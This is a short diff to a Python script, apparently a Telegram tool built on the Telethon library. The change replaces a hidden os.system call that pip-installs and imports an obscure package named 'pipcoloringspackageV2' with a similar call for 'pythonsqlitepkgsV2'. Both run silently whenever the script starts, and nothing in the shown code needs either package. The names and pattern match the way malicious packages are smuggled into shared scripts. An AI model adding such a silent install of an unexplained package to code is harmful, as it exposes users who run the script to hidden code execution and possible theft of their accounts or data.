@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringspackageV2")
-import pipcoloringspackageV2
+os.system("pip install pythonsqlitepkgsV2")
+import pythonsqlitepkgsV2
 from telethon.sync import TelegramClient
 from telethon.tl.functions.messages import GetDialogsRequest
 from telethon.tl.types import InputPeerEmpty, InputPeerChannel
